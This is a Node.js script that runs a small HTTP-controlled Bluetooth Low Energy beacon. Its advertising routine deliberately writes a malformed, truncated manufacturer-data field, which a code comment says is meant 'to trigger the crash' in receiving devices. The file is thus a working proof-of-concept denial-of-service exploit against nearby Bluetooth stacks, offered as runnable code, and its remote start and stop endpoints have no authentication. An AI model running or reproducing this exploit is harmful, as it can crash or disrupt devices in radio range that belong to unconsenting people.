var bleno = require("@abandonware/bleno");
const express = require("express");
const app = express();
const port = 3000;

var PrimaryService = bleno.PrimaryService;
var primaryService = new PrimaryService({
  uuid: "B82AB3FC15954F6A80F0FE094CC218F9",
  characteristics: [],
});

bleno.on("stateChange", function (state) {
  console.log("on -> stateChange: " + state);
  if (state === "poweredOn") {
    console.log("Powered on and ready");
  }
});

bleno.on("advertisingStart", function (error) {
  console.log(
    "on -> advertisingStart: " + (error ? "error " + error : "success")
  );
  if (!error) {
    bleno.setServices([primaryService], function (error) {
      console.log("setServices: " + (error ? "error " + error : "success"));
    });
  }
});

app.get("/start", (req, res) => {
  startAdvertising("wabz", [primaryService.uuid]);
  res.send(JSON.stringify({ result: "success" }));
});

app.get("/stop", (req, res) => {
  bleno.stopAdvertising();
  res.send(JSON.stringify({ result: "success" }));
});

app.listen(port, "0.0.0.0", () =>
  console.log(`Example app listening at http://0.0.0.0:${port}`)
);

startAdvertising = function (name, serviceUuids) {
  var advertisementDataLength = 3;
  var scanDataLength = 0;

  var serviceUuids16bit = [];
  var serviceUuids128bit = [];
  var i = 0;

  if (name && name.length) {
    scanDataLength += 2 + name.length;
  }

  if (serviceUuids && serviceUuids.length) {
    for (i = 0; i < serviceUuids.length; i++) {
      var serviceUuid = new Buffer(
        serviceUuids[i]
          .match(/.{1,2}/g)
          .reverse()
          .join(""),
        "hex"
      );

      if (serviceUuid.length === 2) {
        serviceUuids16bit.push(serviceUuid);
      } else if (serviceUuid.length === 16) {
        serviceUuids128bit.push(serviceUuid);
      }
    }
  }

  if (serviceUuids16bit.length) {
    advertisementDataLength += 2 + 2 * serviceUuids16bit.length;
  }

  if (serviceUuids128bit.length) {
    advertisementDataLength += 2 + 16 * serviceUuids128bit.length;
  }
  advertisementDataLength += 3;
  var advertisementData = new Buffer(advertisementDataLength);
  var scanData = new Buffer(scanDataLength);

  // flags
  advertisementData.writeUInt8(2, 0);
  advertisementData.writeUInt8(0x01, 1);
  advertisementData.writeUInt8(0x06, 2);

  // Malformed manufacturer data. This should really be
  // 3 bytes; length, 2 octects for manufacturer ID. But we need
  // 1 byte of actual data (the FF specifies this is manufacturer data)
  // to trigger the crash.
  advertisementData.writeUInt8(2, 3);
  advertisementData.writeUInt8(0xff, 4);
  advertisementData.writeUInt8(0x4a, 5);

  var advertisementDataOffset = 6;

  if (serviceUuids16bit.length) {
    advertisementData.writeUInt8(
      1 + 2 * serviceUuids16bit.length,
      advertisementDataOffset
    );
    advertisementDataOffset++;

    advertisementData.writeUInt8(0x03, advertisementDataOffset);
    advertisementDataOffset++;

    for (i = 0; i < serviceUuids16bit.length; i++) {
      serviceUuids16bit[i].copy(advertisementData, advertisementDataOffset);
      advertisementDataOffset += serviceUuids16bit[i].length;
    }
  }

  if (serviceUuids128bit.length) {
    advertisementData.writeUInt8(
      1 + 16 * serviceUuids128bit.length,
      advertisementDataOffset
    );
    advertisementDataOffset++;

    advertisementData.writeUInt8(0x06, advertisementDataOffset);
    advertisementDataOffset++;

    for (i = 0; i < serviceUuids128bit.length; i++) {
      serviceUuids128bit[i].copy(advertisementData, advertisementDataOffset);
      advertisementDataOffset += serviceUuids128bit[i].length;
    }
  }

  // name
  if (name && name.length) {
    var nameBuffer = new Buffer(name);

    scanData.writeUInt8(1 + nameBuffer.length, 0);
    scanData.writeUInt8(0x08, 1);
    nameBuffer.copy(scanData, 2);
  }

  bleno.startAdvertisingWithEIRData(advertisementData, scanData);
};
